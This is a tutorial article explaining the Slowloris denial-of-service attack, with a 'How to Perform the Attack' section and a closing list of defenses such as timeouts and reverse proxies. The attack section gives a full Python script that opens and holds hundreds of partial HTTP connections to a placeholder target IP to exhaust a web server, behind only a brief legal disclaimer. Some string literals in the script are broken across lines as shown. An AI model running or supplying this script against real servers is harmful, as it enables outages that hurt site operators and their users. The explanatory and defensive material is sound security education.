The Slowloris Attack: A Low-Bandwidth Denial of Service


Most Denial of Service (DoS) attacks are brute force, relying on overwhelming a server with a massive volume of traffic from a botnet. The Slowloris attack is different. Itâ€™s a stealthy, low-bandwidth attack that can bring down a web server with a single machine and minimal resources.


How it Works


Instead of flooding the server, Slowloris opens multiple connections and keeps them open for as long as possible. It does this by sending partial HTTP requests, but never completing them. The server, waiting for the requests to finish, keeps the connections open. By slowly and continuously opening new connections, Slowloris can exhaust the server's maximum concurrent connection pool, making it unable to respond to legitimate traffic.


The Attack in Detail


  1. The attacker opens multiple connections to the target web server.

  2. On each connection, the attacker sends a partial HTTP request header.

  3. The server, expecting the rest of the header, keeps the connection open.

  4. The attacker periodically sends additional, small pieces of data to keep the connections from timing out.

  5. As more and more connections are opened and held in this "half-open" state, the server's connection pool becomes saturated.

  6. Legitimate users are unable to connect to the server, resulting in a Denial of Service.


How to Perform the Attack


Disclaimer: This information is for educational purposes only. Performing a Slowloris attack on a server without explicit permission is illegal and can have serious consequences.


A Slowloris attack can be performed using a simple Python script. The following script demonstrates the basic principle of the attack: 


            
import socket
import random
import time

target_ip = "X.X.X.X"
target_port = 80

connections = []

def create_socket():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(4)
  s.connect((target_ip, target_port))
  s.send("GET /?{} HTTP/1.1\r\n".
  format(random.randint(0, 2000)).
  encode("utf-8"))
  s.send("User-Agent: Mozilla/5.0 
  (Windows NT 10.0; Win64; x64) 
  AppleWebKit/537.36 
  (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
  .encode("utf-8"))
  s.send("Accept-language: en-US,en,q=0.5\r\n"
  .encode("utf-8"))
  return s


for _ in range(200):
    try:
        s = create_socket()
        connections.append(s)
    except socket.error:
        break

while True:
    for s in list(connections):
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
            connections.remove(s)

    for _ in range(200 - len(connections)):
        try:
            s = create_socket()
            connections.append(s)
        except socket.error:
            break

    time.sleep(15)

Why it's Effective


Slowloris is effective because it doesn't require a lot of bandwidth. It's a "low and slow" attack that can be launched from a single machine. It's also difficult to detect because the traffic it generates looks like legitimate, albeit slow, client traffic.


How to Defend Against a Slowloris Attack


  1. Increase the maximum number of connections: While not a complete solution, increasing the server's connection limit can make it more resilient to Slowloris attacks.

  2. Set a connection timeout: Configure the server to close connections that have been idle for too long. This will prevent Slowloris from holding connections open indefinitely.

  3. Use a reverse proxy: A reverse proxy can be configured to buffer incoming requests and only forward complete requests to the web server. This can help to mitigate the effects of a Slowloris attack.

  4. Use a web application firewall (WAF): A WAF can be configured to detect and block Slowloris attacks.
